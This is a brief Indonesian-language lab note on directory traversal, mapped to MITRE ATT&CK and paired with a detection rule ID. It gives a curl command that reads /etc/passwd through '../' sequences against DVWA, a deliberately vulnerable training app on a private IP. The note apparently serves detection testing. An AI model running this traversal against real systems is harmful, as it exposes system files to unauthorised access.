# Directory Traversal Attack

## Deskripsi
Directory Traversal mengakses file di luar root direktori web
menggunakan sequence `../`.

## MITRE ATT&CK
- Tactic: Discovery
- Technique: T1083 — File and Directory Discovery

## Attack Commands
```bash
SESS="PHPSESSID=YOUR_SESSION; security=low"

curl -s "http://192.168.217.130/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd" \
  -b "$SESS" -o /dev/null -w "Status: %{http_code}\n"
```

## Detection
- Rule ID: 100015
- Level: 10 (High)
